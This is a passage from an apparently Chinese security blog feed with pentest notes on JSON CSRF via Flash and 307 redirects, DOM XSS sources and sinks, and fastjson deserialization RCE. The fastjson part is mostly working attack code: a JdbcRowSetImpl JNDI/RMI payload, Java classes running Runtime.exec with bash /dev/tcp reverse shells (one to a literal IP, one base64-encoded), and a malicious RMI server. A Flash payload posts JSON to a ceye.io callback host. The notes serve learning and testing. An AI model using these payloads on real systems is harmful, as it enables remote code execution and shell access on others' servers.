  &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>但是这个有个缺陷，使用xmlhttprequest的时候，会先发一个OPTIONS请求预检(非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为”预检”请求,即浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的XMLHttpRequest请求，否则就报错)，在使用XHR的时候空域状态下会有跨域限制。这里涉及到cors跨域限制的问题，详情可以看看<br>‘<a href="https://my.oschina.net/hccake/blog/886602&#39;" target="_blank" rel="noopener">https://my.oschina.net/hccake/blog/886602&#39;</a></p>
<p>预检请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">OPTIONS /get_flags_async HTTP/1.1</span><br><span class="line">Host: experiment.appadhoc.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Access-Control-Request-Method: POST</span><br><span class="line">Access-Control-Request-Headers: content-type</span><br><span class="line">Origin: null</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure></p>
<p>其中如果浏览器否定了”预检”请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被XMLHttpRequest对象的onerror回调函数捕获。控制台会打印出如下的报错信息。<br>报错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access to XMLHttpRequest at &apos;https://experiment.appadhoc.com/get_flags_async&apos; from origin &apos;null&apos; has been blocked by CORS policy: Response to preflight request doesn&apos;t pass access control check: The value of the &apos;Access-Control-Allow-Origin&apos; header in the response must not be the wildcard &apos;*&apos; when the request&apos;s credentials mode is &apos;include&apos;. The credentials mode of requests initiated by the XMLHttpRequest is controlled by the withCredentials attribute.</span><br></pre></td></tr></table></figure></p>
<p>服务器设置允许任意域名跨域请求与可携带cookie进行了冲突，这个问题是后端配置的问题<br>（axios默认是发送请求的时候不会带上cookie的，需要通过设置withCredentials: true来解决。 这个时候需要注意需要后端配合设置实际的origin，不能为* ）</p>
<p>遇到cors跨域请求不通过的时候flash　+ 307 跳转就可以派上用场了。</p>
<h5 id="flash-307-即SWF-JSON-CSRF-待补充"><a href="#flash-307-即SWF-JSON-CSRF-待补充" class="headerlink" title="flash + 307 即SWF_JSON_CSRF-待补充"></a>flash + 307 即SWF_JSON_CSRF-待补充</h5><p>参考 <a href="https://github.com/sp1d3r/swf_json_csrf" target="_blank" rel="noopener">https://github.com/sp1d3r/swf_json_csrf</a> </p>
<ul>
<li><p>as编辑swf文件<br>编辑修改swf文件这里我用的是ffdec<br>构造payload如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">   import flash.display.Sprite;</span><br><span class="line">   import flash.net.URLLoader;</span><br><span class="line">   import flash.net.URLRequest;</span><br><span class="line">   import flash.net.URLRequestHeader;</span><br><span class="line">   import flash.net.URLRequestMethod;</span><br><span class="line">   </span><br><span class="line">   public class re extends Sprite</span><br><span class="line">   &#123;</span><br><span class="line">       </span><br><span class="line">      </span><br><span class="line">      public function re()</span><br><span class="line">      &#123;</span><br><span class="line">         var member1:Object = null;</span><br><span class="line">         var myJson:String = null;</span><br><span class="line">         Wonderfl.capture(stage);</span><br><span class="line">         super();</span><br><span class="line">         Wonderfl.capture(stage);</span><br><span class="line">         member1 = new Object();</span><br><span class="line">         member1 = &#123;</span><br><span class="line">            &quot;name&quot;:&quot;attacker&quot;,</span><br><span class="line">            &quot;email&quot;:&quot;attacker@gmail.com&quot;</span><br><span class="line">         &#125;;</span><br><span class="line">         var myData:Object = member1;</span><br><span class="line">         myJson = JSON.stringify(myData);</span><br><span class="line">         myJson = JSON.stringify(myData);</span><br><span class="line">         var url:String = &quot;http://xxxxx.ceye.io&quot;;</span><br><span class="line">         var request:URLRequest = new URLRequest(url);</span><br><span class="line">         request.requestHeaders.push(new URLRequestHeader(&quot;Content-Type&quot;,&quot;application/json&quot;));</span><br><span class="line">         request.data = myJson;</span><br><span class="line">         request.method = URLRequestMethod.POST;</span><br><span class="line">         var urlLoader:URLLoader = new URLLoader();</span><br><span class="line">         try</span><br><span class="line">         &#123;</span><br><span class="line">            urlLoader.load(request);</span><br><span class="line">            return;</span><br><span class="line">         &#125;</span><br><span class="line">         catch(e:Error)</span><br><span class="line">         &#123;</span><br><span class="line">            trace(e);</span><br><span class="line">            return;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>php307 跳转</p>
</li>
</ul>
<p>由于307跳转会带上原有的数据格式和类型，所以使用307跳转</p>
<p>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// redirect automatically</span><br><span class="line"></span><br><span class="line">header(&quot;Location: https://xx.xxx.xx/xx&quot;, true, 307);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2011-February/007533.html</span><br><span class="line">https://my.oschina.net/hccake/blog/886602</span><br><span class="line">https://www.freebuf.com/articles/web/164234.html</span><br><span class="line">https://www.cnblogs.com/blacksunny/p/7930126.html</span><br><span class="line">http://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/</span><br><span class="line">https://github.com/sp1d3r/swf_json_csrf</span><br><span class="line">https://github.com/bottlepy/bottle/issues/616</span><br><span class="line">https://www.leavesongs.com/HTML/sina-jsonp-hijacking-csrf-worm.html</span><br><span class="line">https://www.csdn.net/article/2015-07-14/2825207</span><br><span class="line">https://book.2cto.com/201310/34316.html</span><br><span class="line">http://blog.knownsec.com/2014/06/flashupload_csrf_attacking/</span><br><span class="line">http://cm2.pw/</span><br></pre></td></tr></table></figure>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="CORS与JSONP的区别-待补充"><a href="#CORS与JSONP的区别-待补充" class="headerlink" title="CORS与JSONP的区别-待补充"></a>CORS与JSONP的区别-待补充</h2><p>JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。</p>
]]></content>
      
        <categories>
            
            <category> Web渗透 </category>
            
            <category> 安全策略 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[DOM XSS从javascript中输出数据到HTML页面]]></title>
      <url>/2019/07/21/xss/DOM-XSS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%BB%B6%E4%BC%B8/</url>
      <content type="html"><![CDATA[<p>DOM XSS从javascript中输出数据到HTML页面</p>
<p>存储或反射型XSS是从服务端输出到HTML页面</p>
<h4 id="常见位置"><a href="#常见位置" class="headerlink" title="常见位置"></a>常见位置</h4><h5 id="URL代入页面"><a href="#URL代入页面" class="headerlink" title="URL代入页面"></a>URL代入页面</h5><p>定义：通过js直接获取url中的参数，然后输出到HTML页面</p>
<p>通过window.location.search获取页面url传递的参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function GetQueryString(name) &#123;</span><br><span class="line">    var reg = new RegExp(&quot;(^|&amp;)&quot; + name + &quot;=([^&amp;]*)(&amp;|$)&quot;);</span><br><span class="line">    var r = decodeURI(window.location.search.substr(1)).match(reg);</span><br><span class="line">    if (r != null)return unescape(r[2]);</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var sname = GetQueryString(&quot;name&quot;);</span><br><span class="line">if(sname!=null)&#123;</span><br><span class="line">    var sname_ = decodeURIComponent(sname); </span><br><span class="line">    alert(sname_);</span><br><span class="line">&#125;    #获取具体参数  </span><br><span class="line"></span><br><span class="line">document.getElementById(&apos;foo&apos;).innerHTML = getUrlParam(&apos;foo&apos;) #dom型XSS问题</span><br></pre></td></tr></table></figure>
<p>此时取值时，匹配的URL是location.href，这个值包含了 location.search 和 location.hash 的值，而 location.hash 的值是不被传到服务器，但并且能被前端JS通过 getUrlParam 函数成功取值</p>
<p><strong>location.search:</strong>获取问号后面的参数<br>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.runoob.com/submit.htm?email=someone@ example.com</span><br></pre></td></tr></table></figure></p>
<p>通过document.write(location.search);获取到的是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?email=someone@example.com</span><br></pre></td></tr></table></figure></p>
<p>location.hash:获取url的锚部分，从“#”开始到最后，都是锚部分，不被传到服务器，但并且能被前端JS通过 getUrlParam 函数成功取值。</p>
<h5 id="跳转类"><a href="#跳转类" class="headerlink" title="跳转类"></a>跳转类</h5><p>在 javascript 语法中，使用如下代码可以将页面进行跳转操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">location.href = urlparams.redirecturl;</span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">	&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;script&gt;</span><br><span class="line">			function jump()&#123;</span><br><span class="line">				window.location.href=&quot;javascript:alert(1)&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">		&lt;/script&gt;</span><br><span class="line">		&lt;button type=&quot;button&quot; onclick=&quot;jump()&quot;&gt;test&lt;/button&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">附：</span><br><span class="line">//顶层窗口跳转</span><br><span class="line">//top.location.href=&apos;http://www.baidu.com&apos;;</span><br><span class="line"></span><br><span class="line">//父层窗口跳转</span><br><span class="line">//parent.location.href=&apos;http://www.baidu.com&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//以下均为本页面跳转</span><br><span class="line"></span><br><span class="line">//window.location.href=&quot;http://www.baidu.com&quot;;</span><br><span class="line">//location.href=&quot;http://www.baidu.com&quot;;</span><br><span class="line">//self.location.href=&quot;http://www.baidu.com&quot;;</span><br><span class="line">//this.location.href=&quot;http://www.baidu.com&quot;;</span><br><span class="line">//location.href=&quot;http://www.baidu.com&quot;;</span><br><span class="line">document.location.href</span><br></pre></td></tr></table></figure></p>
<p>这样的跳转通常会出现在登录页、退出页、中间页。<br>如果开发者让用户可以控制 redirecturl 参数，就可以使用 javascript:alert(1) 的形式进行XSS攻击。<br>最近几年的APP开发比较热门，通过web唤起APP的操作也是越来越多，跳转的协议也是多种多样，例如 webview:// , myappbridge:// 等等。 仅仅使用 http 和 https 来判断URL是否合法已经不适用了，于是由跳转所产生的DOM-XSS漏洞也逐渐增多。</p>
<p>测试关注点 输入点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">document.location</span><br><span class="line">document.URL</span><br><span class="line">document.URLUnencoded</span><br><span class="line">document.referrer</span><br><span class="line">window.location（href hash）</span><br><span class="line">所有的inputs</span><br><span class="line">window.name</span><br><span class="line">document.cookie</span><br><span class="line">XMLhttpRequest返回的数据</span><br><span class="line">localstorage</span><br><span class="line"></span><br><span class="line">·····</span><br></pre></td></tr></table></figure></p>
<p>以下几个地方是js输出到HTML的必经之路 输出点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">document.write()</span><br><span class="line">document.writeln()</span><br><span class="line">xxx.innerHTML=</span><br><span class="line">xxx.outerHTML=</span><br><span class="line">innerHTML.replace=</span><br><span class="line">document.attachEvent()</span><br><span class="line">window.attachEvent()</span><br><span class="line">document.location.replace()</span><br><span class="line">document.location.assign()</span><br></pre></td></tr></table></figure></p>
<h5 id="缓存类"><a href="#缓存类" class="headerlink" title="缓存类"></a>缓存类</h5><p>开发者在缓存前端数据的时候，通常会存在 sessionStorage , localStorage , cookie 中，因为 sessionStorage 在页面刷新时就失效的特性，利用方式相对简单的只有后面两种。</p>
<h5 id="参考学习"><a href="#参考学习" class="headerlink" title="参考学习"></a>参考学习</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">https://code.google.com/archive/p/domxsswiki/   domxss 备忘单</span><br><span class="line">https://cstcamaro.github.io/post/2018-ISC-%E6%BC%94%E8%AE%B2%E7%A8%BF?tdsourcetag=s_pctim_aiomsg</span><br><span class="line"></span><br><span class="line">http://blog.nsfocus.net/xss-advance/#23_DOM</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Web安全 </category>
            
            <category> XSS </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> XSS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[fastjson 1.2.47 rce]]></title>
      <url>/2019/07/18/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/fastjson/</url>
      <content type="html"><![CDATA[<p>[TOC]</p>
<h1 id="fastjson-1-2-47-rce"><a href="#fastjson-1-2-47-rce" class="headerlink" title="fastjson 1.2.47 rce"></a>fastjson 1.2.47 rce</h1><p>在渗透测试中 发现了fastjson的有漏洞的版本，<br><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15640447555647.jpg" alt="-w682"></p>
<p>想着尝试下</p>
<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>恶意攻击者可以构造攻击请求绕过FastJSON的黑名单策略。例如，攻击者通过精心构造的请求，远程让服务端执行指定命令</p>
<h2 id="对应payload"><a href="#对应payload" class="headerlink" title="对应payload"></a>对应payload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;name&quot;: &#123;</span><br><span class="line">		&quot;@type&quot;: &quot;java.lang.Class&quot;,</span><br><span class="line">		&quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;x&quot;: &#123;</span><br><span class="line">		&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">		&quot;dataSourceName&quot;:&quot;rmi://ip:port/Exploit&quot;,</span><br><span class="line">		&quot;autoCommit&quot;: true</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15633821836741.jpg" alt="-w497"></p>
<p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15640448645384.jpg" alt="-w1093"></p>
<p>此处简单测试了利用该命令漏洞会去请求exploit。<br>这个漏洞的利用方式跟18年的fastjson反序列化漏洞比较类似，这里先看下18年的fastjson漏洞，跟着分析下</p>
<h2 id="FastJson-JdbcRowSetImpl"><a href="#FastJson-JdbcRowSetImpl" class="headerlink" title="FastJson-JdbcRowSetImpl"></a>FastJson-JdbcRowSetImpl</h2><h3 id="搭建漏洞环境"><a href="#搭建漏洞环境" class="headerlink" title="搭建漏洞环境"></a>搭建漏洞环境</h3><p>根据<a href="https://github.com/iBearcat/FastJson-JdbcRowSetImpl-RCE" target="_blank" rel="noopener">FastJson-JdbcRowSetImpl</a>搭建该漏洞环境，进行测试, 该漏洞环境<br><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637129821308.jpg" alt="-w908"></p>
<h4 id="开启http服务"><a href="#开启http服务" class="headerlink" title="开启http服务"></a>开启http服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Python3 -m http.server 80</span><br></pre></td></tr></table></figure>
<h4 id="生成Payload"><a href="#生成Payload" class="headerlink" title="生成Payload"></a>生成Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar FastJson_JdbcRowSetImpl_JNDI_RMIServer.jar &lt;HTTP服务地址&gt; 指定RMI端口</span><br></pre></td></tr></table></figure>
<h4 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h4><p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15640449119775.jpg" alt="-w1197"></p>
<p>poc 如下<br><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637154042668.jpg" alt="-w756"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import	java.lang.Runtime;</span><br><span class="line">import	java.lang.Process;</span><br><span class="line">public class CommandObject &#123;</span><br><span class="line">    public CommandObject()&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">			Runtime	rt	=	Runtime.getRuntime();</span><br><span class="line">			//Runtime.getRuntime().exec(&quot;bash -i &gt;&amp; /dev/tcp/ip/8550 0&gt;&amp;1&quot;);</span><br><span class="line">			//String[] commands = &#123;&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguMjQuMTQ2LjIwNC84NTUwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;&#125;;</span><br><span class="line">			</span><br><span class="line">			String[] commands = &#123;&quot;ping&quot;,&quot;xxxx.ceye.io&quot;&#125;;</span><br><span class="line">			Process	pc = rt.exec(commands);</span><br><span class="line">            System.out.println(&quot;11111&quot;);</span><br><span class="line">			pc.waitFor();</span><br><span class="line">        &#125;catch(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            System.out.println(&quot;2222&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] argv)&#123;</span><br><span class="line">        CommandObject e = new CommandObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637155154519.jpg" alt="-w1156"></p>
<h4 id="反弹shell-测试"><a href="#反弹shell-测试" class="headerlink" title="反弹shell 测试"></a>反弹shell 测试</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String[] commands = &#123;&quot;bash -i &gt;&amp; /dev/tcp/ip/8550 0&gt;&amp;1&quot;&#125;;</span><br></pre></td></tr></table></figure>
<p>将此处直接修改为该命令，发现结果不行，直接运行该commandobject程序<br><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637230154421.jpg" alt="-w1112"><br>结果发现是zsh 不支持，切换个,网上一堆用如下java反弹shell的写法，结果发现在1.8的jdk，一直不符合格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String[] commands = [&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[];</span><br></pre></td></tr></table></figure></p>
<p>修改后如下,可以反弹shell，还有其他方式暂时未试，详情看<a href="https://blog.spoock.com/2018/11/07/java-reverse-shell/" target="_blank" rel="noopener">使用java反弹shell</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import	java.lang.Runtime;</span><br><span class="line">import	java.lang.Process;</span><br><span class="line">public class fastjson &#123;</span><br><span class="line">    public fastjson()&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            Runtime	rt	=	Runtime.getRuntime();</span><br><span class="line">                       //String[] commands = &#123;&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguMjQuMTQ2LjIwNC84NTUwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;&#125;;</span><br><span class="line">            //String[] commands = &#123;&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;&apos;/bin/bash -i &gt;&amp; /dev/tcp/118.24.146.204/8550 0&gt;&amp;1&apos;&quot;&#125;;</span><br><span class="line">            Process	pc = rt.exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;);</span><br><span class="line">            //System.out.println(commands[0]);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125;catch(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] argv)&#123;</span><br><span class="line">        fastjson e = new fastjson();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15640450186979.jpg" alt="-w1006"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>根据分析，这次遇到的fastjson漏洞不是最近1.2.47版本的，而是之前1.2.24<br>此处反编译的<br>FastJson_JdbcRowSetImpl_JNDI_RMIServer如下<br>创建rmi（java 本身的rpc框架） </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import cn.com.topsec.fastjson.FastJson_JdbcRowSetImpl_JNDI_RMIServer;</span><br><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line">import java.rmi.AlreadyBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line">import javax.naming.Reference;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class FastJson_JdbcRowSetImpl_JNDI_RMIServer</span><br><span class="line">&#123;</span><br><span class="line">  public static void start(String httpServer, int rmiPort, String hostName) throws AlreadyBoundException, RemoteException, NamingException &#123;</span><br><span class="line">    System.out.println(&quot;* Open JNDI-RMI Listener on &quot; + rmiPort);</span><br><span class="line">    System.out.println(&quot;\n [*] HTTPSERVER = &quot; + httpServer);</span><br><span class="line">    System.out.println(&quot; [*] RMIPORT = &quot; + rmiPort);</span><br><span class="line">System.setProperty(&quot;java.rmi.server.hostname&quot;, hostName);</span><br><span class="line">    Registry registry = LocateRegistry.createRegistry(rmiPort);</span><br><span class="line">    Reference reference = new Reference(&quot;CommandObject&quot;, &quot;CommandObject&quot;, httpServer);</span><br><span class="line">    ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);</span><br><span class="line">    registry.bind(&quot;Object&quot;, referenceWrapper);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException &#123;</span><br><span class="line">    String httpServer = args[0];</span><br><span class="line">    int rmiPort = Integer.parseInt(args[1]);</span><br><span class="line">    </span><br><span class="line">    String[] httpServerHost = httpServer.split(&quot;:&quot;);</span><br><span class="line">    </span><br><span class="line">    String hostName = httpServerHost[0];</span><br><span class="line">    </span><br><span class="line">    httpServer = &quot;http://&quot; + httpServer + &quot;/&quot;;</span><br><span class="line">    </span><br><span class="line">    start(httpServer, rmiPort, hostName);</span><br><span class="line">    System.out.println(&quot;\n [*] Payload���&quot;);</span><br><span class="line">    </span><br><span class="line">    System.out.println(&quot; [+] &#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://&quot; + httpServerHost[0] + &quot;:&quot; + rmiPort + &quot;/Object\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;);</span><br><span class="line">    